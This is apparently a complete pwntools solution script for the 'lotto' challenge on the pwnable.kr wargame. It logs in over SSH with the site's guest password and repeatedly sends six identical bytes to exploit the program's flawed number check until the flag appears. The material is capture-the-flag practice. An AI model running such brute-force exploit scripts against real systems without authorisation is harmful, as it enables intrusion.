#!/bin/python3
from pwn import *

s = ssh(user="lotto", host="pwnable.kr", port=2222, password="guest")
io = s.process("./lotto")

io.recv()
i = 0
response = b"bad luck"
while b"bad luck" in response:
    io.sendline(b"1") # saying you want to play
    io.sendline(6*b"!") # some value below 35 does not really matter
    io.recvline() # ignoring useless
    response = io.recv()
    log.info(f"try number {i}")
    i += 1

log.success(f"flag: {response.decode()}")
